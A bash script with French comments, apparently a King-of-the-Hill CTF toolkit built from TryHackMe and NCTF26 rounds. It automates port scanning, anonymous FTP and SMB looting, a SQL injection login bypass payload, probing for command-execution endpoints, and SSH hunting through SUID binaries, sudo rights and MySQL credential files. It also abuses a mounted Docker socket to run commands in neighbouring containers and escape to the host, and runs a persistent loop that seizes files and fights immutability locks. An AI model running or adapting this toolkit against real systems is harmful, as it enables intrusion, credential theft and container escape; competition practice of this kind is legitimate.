#!/usr/bin/env bash
# koth_auto.sh — Boite a outils KOTH generique, a adapter juste en changeant
# l'IP. Construite a partir de 2 rounds reels joues et gagnes (THM, 2026-10-30) :
#   - Round 1 (H1:Hard) : fuite creds API -> SSH -> root PwnKit -> decouverte
#     docker.sock -> exec dans conteneurs voisins -> evasion hote physique ->
#     bataille chattr +i/-i -> victoire via King Time cumule (450 vs 390 pts).
#   - Round 2 (Tyler)   : flag direct via partage SMB anonyme (pas seulement
#     liste des partages — il faut TELECHARGER le contenu).
#
# AUCUNE box KOTH n'est identique : ce script fait gagner du temps sur le
# repetitif (recon, SMB, SSH hunt, ecriture+maintien du fichier king), il ne
# garantit pas un pwn 100% automatique. L'exploitation initiale (RCE/SQLi
# specifique a la box) reste a faire a la main une fois les pistes identifiees.
#
# Lecon cle round 1 : ne JAMAIS se contenter des ports "probables" — scanner
# TOUT (-p-), les vecteurs gagnants vivent souvent sur des ports custom.
# Lecon cle round 2 : un partage SMB anonyme peut contenir le flag EN DIRECT,
# toujours descendre les fichiers, pas juste lister.
# Lecon cle round 1 (le facteur decisif) : le King Time cumule compte plus que
# la prise initiale — ne jamais s'arreter a une seule ecriture du fichier king,
# boucler la reassertion en arriere-plan pendant tout le round. Le vrai fichier
# king peut vivre HORS des conteneurs applicatifs, sur l'hote physique —
# toujours verifier /var/run/docker.sock une fois root/acces privilegie.
#
# Usage:
#   ./koth_auto.sh <IP> <NOM_EQUIPE_OU_PSEUDO> [SSH_USER] [SSH_PASS] [SSH_PORT]
#   ./koth_auto.sh --holdking <IP> <NOM_EQUIPE_OU_PSEUDO> <SSH_USER> <SSH_PASS> [SSH_PORT] [INTERVAL_SEC]
#
#   Phase 1 (recon, debut de round, pas encore d'acces) :
#     ./koth_auto.sh 10.10.76.190 NotreEquipe
#
#   Phase 2 (creds SSH trouves a la main — fuite API, SQLi, SMB, etc.) :
#     ./koth_auto.sh 10.10.76.190 NotreEquipe hermione 'motdepasse' 10514
#     -> chasse les flags, cherche docker.sock, ecrit le fichier king partout
#        ou possible, et PROPOSE la commande pour lancer la boucle de maintien.
#
#   Phase 3 (boucle de maintien du King Time, a lancer en arriere-plan une
#   fois root/ecriture king confirmee — c'est CA qui fait gagner le round) :
#     nohup ./koth_auto.sh --holdking 10.10.76.190 NotreEquipe hermione 'motdepasse' 10514 15 \
#       > koth_holdking.log 2>&1 &
#
# Format de flag detecte par defaut : NCTF{...} ou THM{...} (insensible a la
# casse). Pour un autre format, exporte FLAG_REGEX avant de lancer :
#   export FLAG_REGEX='FLAG\{[^}]+\}'
#
# IMPORTANT reglement NCTF26 : pas de bruteforce ni de denial-of-service.
# Ce script ne fait AUCUN bruteforce de mot de passe par defaut — seulement
# des tests anonymes/par defaut (FTP/SMB anonyme, SQLi bypass classique en
# UNE requete). Ne pas y ajouter de bruteforce de credentials.

set -uo pipefail

MODE="recon"
if [[ "${1:-}" == "--holdking" ]]; then
    MODE="holdking"
    shift
fi

IP="${1:-}"
TEAM="${2:-}"
SSH_USER="${3:-}"
SSH_PASS="${4:-}"
SSH_PORT="${5:-22}"
HOLD_INTERVAL="${6:-15}"

FLAG_REGEX="${FLAG_REGEX:-NCTF\{[^}]+\}|THM\{[^}]+\}}"

# Noms de fichier "king"/"owner" candidats : chaque plateforme KOTH a sa
# propre convention. "king" (sans extension) en tete -- confirme par le
# texte officiel NCTF26 (/connexion, releve le 2026-10-31): "ecrivez le
# jeton de votre equipe ... dans son fichier « king »". Le contenu attendu
# est le JETON D'EQUIPE affiche sur la page King of the Hill, pas un pseudo
# libre -- a reconfirmer une fois la page ouverte le 2026-11-06 et le jeton
# reel observe. Variantes ".txt" gardees en repli pour les autres plateformes
# (TryHackMe, etc.) qui n'ont pas cette convention exacte.
KING_FILENAMES=("king" "king.txt" "owner.txt" "flag.txt")
KING_DIR_CANDIDATES=("/root" "/opt/koth" "/var/koth" "/srv/koth")

if [[ -z "$IP" || -z "$TEAM" ]]; then
    echo "Usage: $0 <IP> <NOM_EQUIPE_OU_PSEUDO> [SSH_USER] [SSH_PASS] [SSH_PORT]"
    echo "       $0 --holdking <IP> <NOM_EQUIPE> <SSH_USER> <SSH_PASS> [SSH_PORT] [INTERVAL_SEC]"
    exit 1
fi

TS=$(date +%s)
OUTDIR="./koth_${IP}_${TS}"
mkdir -p "$OUTDIR" 2>/dev/null
FLAGFILE="$OUTDIR/flags_found.txt"
touch "$FLAGFILE" 2>/dev/null
# Fichier stable (pas horodate) qui garde le chemin king qui a marche pour
# cette IP, pour que --holdking puisse le reutiliser sans tout re-decouvrir.
STATE_FILE="./koth_${IP}_kingpath.txt"

C_G="\033[1;32m"; C_R="\033[1;31m"; C_Y="\033[1;33m"; C_B="\033[1;34m"; C_N="\033[0m"

log()  { echo -e "${C_B}[*]${C_N} $*"; }
ok()   { echo -e "${C_G}[+]${C_N} $*"; }
warn() { echo -e "${C_Y}[!]${C_N} $*"; }
err()  { echo -e "${C_R}[-]${C_N} $*"; }

grab_flags() {
    # $1 = texte a scanner, $2 = source (pour le log)
    local matches
    matches=$(grep -ioE "$FLAG_REGEX" <<<"$1" 2>/dev/null | sort -u)
    if [[ -n "$matches" ]]; then
        while IFS= read -r m; do
            if ! grep -qxF "$m" "$FLAGFILE" 2>/dev/null; then
                ok "FLAG trouve (${2}) : $m"
                echo "$m" >> "$FLAGFILE"
            fi
        done <<<"$matches"
    fi
}

ssh_run() {
    # Wrapper SSH reutilisable (phase 2 et 3)
    sshpass -p "$SSH_PASS" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o ConnectTimeout=6 "$SSH_USER@$IP" "$@"
}

# ============================================================
# PHASE 1 — RECON COMPLETE
# ============================================================
phase1_recon() {
    log "Phase 1 : scan complet des ports sur $IP (peut prendre 30-60s)..."
    sudo nmap --privileged -Pn -p- --min-rate 3000 -T4 --max-retries 1 -oN "$OUTDIR/ports.txt" "$IP" >/dev/null 2>&1 \
        || nmap -Pn -p- --min-rate 3000 -T4 --max-retries 1 -oN "$OUTDIR/ports.txt" "$IP" >/dev/null 2>&1

    PORTS=$(grep -oE '^[0-9]+/tcp\s+open' "$OUTDIR/ports.txt" | grep -oE '^[0-9]+')
    if [[ -z "$PORTS" ]]; then
        err "Aucun port ouvert detecte (scan rate ou VPN down ?)."
        cat "$OUTDIR/ports.txt"
        exit 1
    fi
    ok "Ports ouverts : $(echo $PORTS | tr '\n' ' ')"
    warn "Rappel : ne pas s'arreter aux ports 'probables' (80/22/etc.) — les vecteurs KOTH vivent souvent sur un port custom ci-dessus."

    PORTLIST=$(echo $PORTS | tr ' ' ',')
    log "Scan de version/scripts sur ces ports..."
    nmap -Pn -p"$PORTLIST" -sV -sC -oN "$OUTDIR/services.txt" "$IP" >/dev/null 2>&1 &
    NMAP_PID=$!

    for p in $PORTS; do
        case "$p" in
            21)
                log "[FTP:$p] Test anonyme..."
                {
                    echo "user anonymous anonymous"
                    echo "ls -la"
                } | timeout 10 ftp -n "$IP" "$p" > "$OUTDIR/ftp_${p}.txt" 2>&1
                if grep -qi "230" "$OUTDIR/ftp_${p}.txt"; then
                    ok "[FTP:$p] Acces anonyme OK — voir $OUTDIR/ftp_${p}.txt"
                    grab_flags "$(cat "$OUTDIR/ftp_${p}.txt")" "FTP:$p listing"
                else
                    warn "[FTP:$p] Anonyme refuse."
                fi
                ;;
            139|445)
                log "[SMB:$p] Test anonyme + listing des partages..."
                timeout 10 smbclient -L "//$IP/" -N > "$OUTDIR/smb_shares.txt" 2>&1
                ok "[SMB] Partages listes — voir $OUTDIR/smb_shares.txt"
                cat "$OUTDIR/smb_shares.txt"

                # Lecon round 2 : descendre le CONTENU de chaque partage, pas
                # juste la liste — le flag peut etre directement dans un fichier.
                SHARES=$(grep -oE '^\s*\S+\s+Disk' "$OUTDIR/smb_shares.txt" 2>/dev/null | awk '{print $1}')
                SMB_DUMP_DIR="$OUTDIR/smb_dump"
                mkdir -p "$SMB_DUMP_DIR"
                for share in $SHARES; do
                    [[ "$share" == "IPC\$" || "$share" == "print\$" ]] && continue
                    log "[SMB:$p] Telechargement recursif du partage '$share'..."
                    ( cd "$SMB_DUMP_DIR" && timeout 20 smbclient "//$IP/$share" -N -c "prompt OFF; recurse ON; mget *" >/dev/null 2>&1 )
                done
                if [[ -n "$(ls -A "$SMB_DUMP_DIR" 2>/dev/null)" ]]; then
                    ok "[SMB] Fichiers telecharges dans $SMB_DUMP_DIR :"
                    find "$SMB_DUMP_DIR" -type f | sed 's/^/    /'
                    grab_flags "$(find "$SMB_DUMP_DIR" -type f -exec cat {} \; 2>/dev/null)" "SMB:$p fichiers telecharges"
                    # Indices de creds souvent trouves en clair (ex. alert.txt round 2)
                    find "$SMB_DUMP_DIR" -type f -iname "*alert*" -o -iname "*cred*" -o -iname "*pass*" 2>/dev/null \
                        | while read -r f; do warn "[SMB] Fichier potentiel de creds : $f -> $(cat "$f" 2>/dev/null | head -3)"; done
                fi
                ;;
            22)
                log "[SSH:$p] Banner : $(timeout 5 bash -c "echo | nc -w3 $IP $p 2>/dev/null | head -c 80")"
                ;;
            *)
                log "[TCP:$p] Banner brut : $(timeout 5 bash -c "echo | nc -w3 $IP $p 2>/dev/null | head -c 120")"
                ;;
        esac
    done

    # --- Sondage HTTP generique sur TOUS les ports ouverts (y compris non-standards) ---
    for p in $PORTS; do
        BODY=$(timeout 6 curl -s -m 5 "http://$IP:$p/" 2>/dev/null)
        if [[ -n "$BODY" ]]; then
            echo "$BODY" > "$OUTDIR/http_${p}_root.html"
            ok "[HTTP:$p] Reponse HTTP recue — voir $OUTDIR/http_${p}_root.html"
            grab_flags "$BODY" "HTTP:$p /"

            if echo "$BODY" | grep -qiE '<form[^>]*action="([^"]*login[^"]*)"'; then
                ACTION=$(echo "$BODY" | grep -oiE 'action="[^"]*"' | head -1 | sed -E 's/action="([^"]*)"/\1/')
                warn "[HTTP:$p] Formulaire de login detecte (action=$ACTION) — tentative SQLi bypass (1 requete, pas de bruteforce)..."
                for field in username user login email; do
                    RESP=$(timeout 6 curl -s -m 5 -X POST "http://$IP:$p/$ACTION" \
                        --data-urlencode "$field=admin' OR '1'='1'-- -" \
                        --data-urlencode "password=x" 2>/dev/null)
                    if [[ -n "$RESP" ]]; then
                        grab_flags "$RESP" "HTTP:$p SQLi bypass($field)"
                    fi
                done
            fi

            for apiendpoint in api/cmd cmd api/ping ping; do
                RESP=$(timeout 5 curl -s -m 4 -X POST "http://$IP:$p/$apiendpoint" --data "id" 2>/dev/null)
                if echo "$RESP" | grep -qE 'uid=[0-9]+\(.*\)'; then
                    ok "[HTTP:$p] RCE probable sur /$apiendpoint !! Reponse : $RESP"
                    echo "RCE_ENDPOINT=http://$IP:$p/$apiendpoint" >> "$OUTDIR/rce_found.txt"
                fi
            done
        fi
    done

    wait "$NMAP_PID" 2>/dev/null
    ok "Scan de version termine — voir $OUTDIR/services.txt"
    grab_flags "$(cat "$OUTDIR/services.txt")" "nmap -sV -sC banners"

    echo
    ok "=== FIN PHASE 1 ==="
    if [[ -f "$OUTDIR/rce_found.txt" ]]; then
        warn "RCE endpoint(s) detecte(s) — exploite-le directement :"
        cat "$OUTDIR/rce_found.txt"
        echo "  Exemple : curl -X POST <RCE_ENDPOINT> --data 'ta_commande'"
    fi
    warn "Regarde les fichiers dans $OUTDIR pour la suite manuelle (chaque box KOTH a ses propres vulnerabilites)."
    warn "Des que tu as des creds SSH (trouves a la main), relance :"
    echo "  $0 $IP $TEAM <user> <pass> <port>"
}

# ============================================================
# PHASE 2 — CHASSE AUX FLAGS + DOCKER.SOCK + FICHIER KING
# ============================================================
phase2_hunt() {
    log "Phase 2 : connexion SSH a $SSH_USER@$IP:$SSH_PORT..."

    if ! command -v sshpass >/dev/null; then
        err "sshpass n'est pas installe (sudo apt install sshpass). Abandon phase 2."
        return 1
    fi

    if ! ssh_run "true" 2>/dev/null; then
        err "Connexion SSH echouee. Verifie user/pass/port."
        return 1
    fi
    ok "SSH OK."

    log "Recherche de flags, sudo -l, SUID, mysql history, cron, demon KOTH, docker.sock..."
    REMOTE_OUT=$(ssh_run "
        echo '---find-flags---'
        find / -xdev \( -iname 'flag*' -o -iname '*.flag' -o -iname 'king*' -o -iname 'owner*' -o -iname 'NCTF*' -o -iname 'thm*' \) 2>/dev/null -exec sh -c 'echo ==={}===; cat {} 2>/dev/null' \;
        echo '---koth-daemon-strings---'
        for b in /root/koth /opt/koth/* /usr/local/bin/koth* /usr/local/bin/*agent* /usr/bin/koth*; do
            [ -f \"\$b\" ] && echo \"== \$b ==\" && strings \"\$b\" 2>/dev/null | grep -iE 'king|owner|\\.txt' | head -20
        done
        echo '---docker-sock---'
        ls -la /var/run/docker.sock 2>/dev/null
        echo '---sudo-l---'
        sudo -n -l 2>&1
        echo '---suid---'
        find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
        echo '---mysql-history---'
        cat ~/.mysql_history 2>/dev/null
        cat /root/.mysql_history 2>/dev/null
        echo '---debian-cnf---'
        cat /etc/mysql/debian.cnf 2>/dev/null
        echo '---crontab---'
        crontab -l 2>&1
        cat /etc/crontab 2>/dev/null | grep -v '^#'
    " 2>&1)

    echo "$REMOTE_OUT" > "$OUTDIR/ssh_hunt.txt"
    ok "Resultats bruts dans $OUTDIR/ssh_hunt.txt"
    grab_flags "$REMOTE_OUT" "SSH hunt"

    if echo "$REMOTE_OUT" | grep -qE 'NOPASSWD:\s*/bin/date'; then
        warn "sudo date NOPASSWD detecte -> lecture arbitraire de fichiers root possible."
        echo "  Exemple : ssh_run \"sudo -n /bin/date -f /root/<nom_fichier>\""
    fi

    # --- Lecon round 1 : docker.sock monte -> acces root a TOUS les conteneurs
    # voisins + evasion possible vers le filesystem de l'hote physique, ou le
    # VRAI fichier king peut vivre (invisible depuis les conteneurs applicatifs).
    DOCKER_SOCK_FOUND=$(echo "$REMOTE_OUT" | grep -A1 '^---docker-sock---' | tail -1)
    if [[ -n "$DOCKER_SOCK_FOUND" ]]; then
        ok "docker.sock trouve ! Enumeration des conteneurs voisins..."
        DOCKER_OUT=$(ssh_run "
            python3 -c \"
import json, socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/var/run/docker.sock')
s.sendall(b'GET /containers/json HTTP/1.1\r\nHost: localhost\r\n\r\n')
data = b''
while True:
    chunk = s.recv(4096)
    if not chunk: break
    data += chunk
    if len(chunk) < 4096: break
print(data.decode(errors='replace'))
\" 2>&1
        ")
        echo "$DOCKER_OUT" > "$OUTDIR/docker_containers.txt"
        CONTAINER_IDS=$(grep -oE '\"Id\":\"[a-f0-9]+\"' "$OUTDIR/docker_containers.txt" | grep -oE '[a-f0-9]{12,64}' | sort -u)
        if [[ -n "$CONTAINER_IDS" ]]; then
            ok "Conteneurs trouves : $(echo "$CONTAINER_IDS" | wc -l)"
            for cid in $CONTAINER_IDS; do
                log "  -> recherche de flags dans le conteneur $cid..."
                CID_OUT=$(ssh_run "docker exec $cid sh -c \"find / -xdev \\( -iname 'flag*' -o -iname 'king*' -o -iname 'NCTF*' \\) 2>/dev/null -exec cat {} \\;\"" 2>&1)
                echo "=== $cid ===" >> "$OUTDIR/docker_flags.txt"
                echo "$CID_OUT" >> "$OUTDIR/docker_flags.txt"
                grab_flags "$CID_OUT" "docker exec $cid"
            done
            ok "Detail par conteneur dans $OUTDIR/docker_flags.txt"
        fi
        warn "Pour verifier si le VRAI fichier king vit sur l'hote physique (pas dans un conteneur) :"
        echo "  ssh_run \"docker run --rm -v /:/hostfs --privileged alpine find /hostfs/root /hostfs/opt/koth -iname '*king*' -o -iname '*owner*' 2>/dev/null\""
    fi

    log "Tentative d'ecriture du fichier king (hote direct, plusieurs noms/emplacements)..."
    WRITE_LOG="$OUTDIR/king_write.txt"
    : > "$WRITE_LOG"
    WINNING_PATH=""
    for dir in "${KING_DIR_CANDIDATES[@]}"; do
        for fname in "${KING_FILENAMES[@]}"; do
            PATH_TRY="$dir/$fname"
            WRITE_OUT=$(ssh_run "
                echo '$TEAM' > '$PATH_TRY' 2>&1 && echo KING_OK_DIRECT:$PATH_TRY
                sudo -n bash -c \"echo '$TEAM' > '$PATH_TRY'\" 2>&1 && echo KING_OK_SUDO:$PATH_TRY
            " 2>&1)
            echo "-- $PATH_TRY --" >> "$WRITE_LOG"
            echo "$WRITE_OUT" >> "$WRITE_LOG"
            if echo "$WRITE_OUT" | grep -q "KING_OK"; then
                ok "Fichier king ecrit avec succes : $PATH_TRY = $TEAM"
                WINNING_PATH="$PATH_TRY"
            fi
        done
    done

    if [[ -n "$WINNING_PATH" ]]; then
        echo "$WINNING_PATH" > "$STATE_FILE"
        ok "Chemin king sauvegarde dans $STATE_FILE pour la boucle de maintien."
        warn ">>> MAINTENANT LANCE LA BOUCLE DE MAINTIEN (le facteur decisif du round 1) :"
        echo "  nohup $0 --holdking $IP $TEAM $SSH_USER '$SSH_PASS' $SSH_PORT 15 > koth_holdking.log 2>&1 &"
    else
        warn "Aucune ecriture directe n'a reussi (pas encore root, ou chemin/nom different sur cette box)."
        warn "Verifie le vrai chemin attendu : cherche les strings du demon KOTH (section koth-daemon-strings dans $OUTDIR/ssh_hunt.txt)."
        warn "Une fois le bon chemin identifie a la main, enregistre-le puis lance la boucle :"
        echo "  echo '/chemin/exact/king.txt' > $STATE_FILE"
        echo "  nohup $0 --holdking $IP $TEAM $SSH_USER '$SSH_PASS' $SSH_PORT 15 > koth_holdking.log 2>&1 &"
    fi
}

# ============================================================
# PHASE 3 — BOUCLE DE MAINTIEN DU KING TIME (le facteur decisif)
# ============================================================
# Lecon round 1 : une seule ecriture ne suffit pas, l'adversaire reprend la
# colline en quelques minutes. Il faut reecrire en continu ET gerer la guerre
# de verrouillage chattr +i/-i. Le classement final se gagne sur le King Time
# CUMULE, pas sur l'instant de la premiere prise (450 vs 390 pts au final).
phase3_holdking() {
    if [[ -z "$SSH_USER" || -z "$SSH_PASS" ]]; then
        err "--holdking necessite SSH_USER et SSH_PASS."
        exit 1
    fi
    if ! command -v sshpass >/dev/null; then
        err "sshpass n'est pas installe."
        exit 1
    fi

    local king_path=""
    if [[ -f "$STATE_FILE" ]]; then
        king_path=$(cat "$STATE_FILE")
    fi
    if [[ -z "$king_path" ]]; then
        err "Aucun chemin king connu pour $IP (lance d'abord phase 2, ou echo le chemin dans $STATE_FILE)."
        exit 1
    fi

    ok "Boucle de maintien demarree — reecriture de '$king_path' = $TEAM toutes les ${HOLD_INTERVAL}s."
    warn "Ctrl+C ou 'kill' ce process pour arreter. A lancer avec nohup/& pour survivre a la fermeture du terminal."

    local fails=0
    while true; do
        WRITE_OUT=$(ssh_run "
            echo '$TEAM' > '$king_path' 2>&1 && echo HOLD_OK || echo HOLD_FAIL
        " 2>&1)

        if echo "$WRITE_OUT" | grep -q "HOLD_OK"; then
            fails=0
            echo "[$(date +%H:%M:%S)] OK — king='$TEAM' ecrit sur $king_path"
        else
            fails=$((fails+1))
            warn "[$(date +%H:%M:%S)] Echec d'ecriture (tentative $fails) — $WRITE_OUT"

            # Lecon round 1 : l'adversaire peut verrouiller en immutable.
            # On tente de lever le verrou, puis on reecrit immediatement.
            UNLOCK_OUT=$(ssh_run "
                chattr -i '$king_path' 2>&1
                sudo -n chattr -i '$king_path' 2>&1
                echo '$TEAM' > '$king_path' 2>&1 && echo HOLD_OK_AFTER_UNLOCK
                chattr +i '$king_path' 2>&1
                sudo -n chattr +i '$king_path' 2>&1
            " 2>&1)
            if echo "$UNLOCK_OUT" | grep -q "HOLD_OK_AFTER_UNLOCK"; then
                ok "[$(date +%H:%M:%S)] Verrou adversaire leve, king repris et re-verrouille."
                fails=0
            else
                warn "[$(date +%H:%M:%S)] Verrou adversaire NON leve avec l'acces courant."
                warn "  -> si docker.sock dispo, lance un conteneur --privileged -v /:/hostfs pour lever le verrou cote hote :"
                echo "     ssh_run \"docker run --rm -v /:/hostfs --privileged alpine sh -c 'chattr -i /hostfs$king_path; echo $TEAM > /hostfs$king_path; chattr +i /hostfs$king_path'\""
            fi
        fi
        sleep "$HOLD_INTERVAL"
    done
}

# ============================================================
# MAIN
# ============================================================
if [[ "$MODE" == "holdking" ]]; then
    phase3_holdking
    exit 0
fi

echo "=================================================="
echo " KOTH AUTO — cible: $IP   equipe/pseudo: $TEAM"
echo " Format de flag : $FLAG_REGEX"
echo "=================================================="

if [[ -n "$SSH_USER" && -n "$SSH_PASS" ]]; then
    phase2_hunt
else
    phase1_recon
fi

echo
echo "=================================================="
if [[ -s "$FLAGFILE" ]]; then
    ok "FLAGS TROUVES (${FLAGFILE}) :"
    cat "$FLAGFILE"
else
    warn "Aucun flag trouve automatiquement cette fois — exploitation manuelle requise."
fi
echo "=================================================="
